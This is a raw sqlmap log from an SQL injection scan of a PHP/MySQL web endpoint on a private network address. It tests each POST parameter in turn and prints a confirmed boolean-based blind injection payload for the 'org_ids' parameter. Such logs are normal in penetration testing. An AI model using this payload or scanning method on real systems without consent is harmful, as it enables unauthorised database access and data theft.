        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.0.12.16#dev}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:42:55

[17:42:55] [INFO] testing connection to the target URL
[17:42:55] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[17:42:55] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS/IDS
do you want sqlmap to try to detect backend WAF/IPS/IDS? [y/N] N
[17:42:55] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[17:42:55] [INFO] testing if the target URL is stable
[17:42:56] [INFO] target URL is stable
[17:42:56] [INFO] testing if POST parameter 'm' is dynamic
[17:42:56] [INFO] confirming that POST parameter 'm' is dynamic
[17:42:56] [INFO] POST parameter 'm' is dynamic
[17:42:56] [WARNING] heuristic (basic) test shows that POST parameter 'm' might not be injectable
[17:42:56] [INFO] testing for SQL injection on POST parameter 'm'
[17:42:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:42:56] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[17:42:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:42:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:42:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:42:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:42:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:42:57] [INFO] testing 'MySQL inline queries'
[17:42:57] [INFO] testing 'PostgreSQL inline queries'
[17:42:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:42:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:42:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:42:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:42:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:42:57] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:42:57] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:42:57] [INFO] testing 'Oracle AND time-based blind'
[17:42:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:42:58] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it with option '--dbms'
[17:42:58] [WARNING] POST parameter 'm' does not seem to be injectable
[17:42:58] [INFO] testing if POST parameter 'a' is dynamic
[17:42:58] [INFO] confirming that POST parameter 'a' is dynamic
[17:42:58] [INFO] POST parameter 'a' is dynamic
[17:42:58] [WARNING] heuristic (basic) test shows that POST parameter 'a' might not be injectable
[17:42:58] [INFO] testing for SQL injection on POST parameter 'a'
[17:42:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:42:59] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[17:42:59] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:42:59] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:42:59] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:42:59] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:42:59] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:42:59] [INFO] testing 'MySQL inline queries'
[17:42:59] [INFO] testing 'PostgreSQL inline queries'
[17:42:59] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:42:59] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:42:59] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:42:59] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:42:59] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:42:59] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:42:59] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:43:00] [INFO] testing 'Oracle AND time-based blind'
[17:43:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:43:00] [WARNING] POST parameter 'a' does not seem to be injectable
[17:43:00] [INFO] testing if POST parameter 'device_type' is dynamic
[17:43:00] [INFO] confirming that POST parameter 'device_type' is dynamic
[17:43:00] [INFO] POST parameter 'device_type' is dynamic
[17:43:01] [WARNING] heuristic (basic) test shows that POST parameter 'device_type' might not be injectable
[17:43:01] [INFO] testing for SQL injection on POST parameter 'device_type'
[17:43:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:43:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[17:43:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:43:01] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:43:01] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:43:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:43:01] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:43:01] [INFO] testing 'MySQL inline queries'
[17:43:01] [INFO] testing 'PostgreSQL inline queries'
[17:43:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:43:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:43:02] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:43:02] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:43:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:43:02] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:43:02] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:43:02] [INFO] testing 'Oracle AND time-based blind'
[17:43:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:43:03] [WARNING] POST parameter 'device_type' does not seem to be injectable
[17:43:03] [INFO] testing if POST parameter 'school' is dynamic
[17:43:03] [INFO] confirming that POST parameter 'school' is dynamic
[17:43:03] [INFO] POST parameter 'school' is dynamic
[17:43:03] [WARNING] heuristic (basic) test shows that POST parameter 'school' might not be injectable
[17:43:04] [INFO] testing for SQL injection on POST parameter 'school'
[17:43:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:43:04] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[17:43:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:43:04] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:43:04] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:43:04] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:43:05] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:43:05] [INFO] testing 'MySQL inline queries'
[17:43:05] [INFO] testing 'PostgreSQL inline queries'
[17:43:05] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:43:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:43:05] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:43:05] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:43:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:43:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:43:05] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:43:05] [INFO] testing 'Oracle AND time-based blind'
[17:43:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[17:43:07] [WARNING] POST parameter 'school' does not seem to be injectable
[17:43:07] [INFO] testing if POST parameter 'verify' is dynamic
[17:43:07] [INFO] confirming that POST parameter 'verify' is dynamic
[17:43:07] [INFO] POST parameter 'verify' is dynamic
[17:43:07] [WARNING] heuristic (basic) test shows that POST parameter 'verify' might not be injectable
[17:43:07] [INFO] testing for SQL injection on POST parameter 'verify'
[17:43:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:43:08] [INFO] POST parameter 'verify' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[17:43:08] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:43:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:43:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:43:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:43:08] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:43:08] [INFO] testing 'MySQL inline queries'
[17:43:08] [INFO] testing 'PostgreSQL inline queries'
[17:43:08] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:43:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:43:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:43:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:43:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:43:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:43:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:43:09] [INFO] testing 'Oracle AND time-based blind'
[17:43:09] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:43:09] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[17:43:09] [INFO] checking if the injection point on POST parameter 'verify' is a false positive
[17:43:09] [WARNING] false positive or unexploitable injection point detected
[17:43:09] [WARNING] POST parameter 'verify' does not seem to be injectable
[17:43:09] [INFO] testing if POST parameter 'org_ids' is dynamic
[17:43:09] [INFO] confirming that POST parameter 'org_ids' is dynamic
[17:43:09] [INFO] POST parameter 'org_ids' is dynamic
[17:43:09] [INFO] heuristic (basic) test shows that POST parameter 'org_ids' might be injectable
[17:43:09] [INFO] testing for SQL injection on POST parameter 'org_ids'
[17:43:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[17:43:10] [INFO] POST parameter 'org_ids' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[17:43:10] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[17:43:10] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[17:43:10] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[17:43:10] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[17:43:10] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[17:43:10] [INFO] testing 'MySQL inline queries'
[17:43:10] [INFO] testing 'PostgreSQL inline queries'
[17:43:10] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[17:43:10] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[17:43:10] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[17:43:10] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[17:43:10] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[17:43:10] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[17:43:10] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[17:43:10] [INFO] testing 'Oracle AND time-based blind'
[17:43:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[17:43:10] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[17:43:11] [INFO] target URL appears to have 1 column in query
[17:43:11] [WARNING] applying generic concatenation (CONCAT)
[17:43:11] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[17:43:11] [INFO] checking if the injection point on POST parameter 'org_ids' is a false positive
POST parameter 'org_ids' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 710 HTTP(s) requests:
---
Parameter: org_ids (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: m=org&a=orgSetGraduation&device_type=web&school=yingcai&verify=10265_MS_yingcai__web__5b18facd818e1__2fb4fdcf2eabf4130c881435852b1d84__39osTnI13TtVOfMP2qHHfZg53R0giFc23BUw&org_ids=25) AND 7248=7248 AND (8062=8062&status=9
---
[17:43:11] [INFO] testing MySQL
[17:43:11] [INFO] confirming MySQL
[17:43:12] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.2.1
back-end DBMS: MySQL >= 5.0.2
[17:43:12] [INFO] fetched data logged to text files under '/Users/zhaichuang/.sqlmap/output/172.16.56.199'

[*] shutting down at 17:43:12

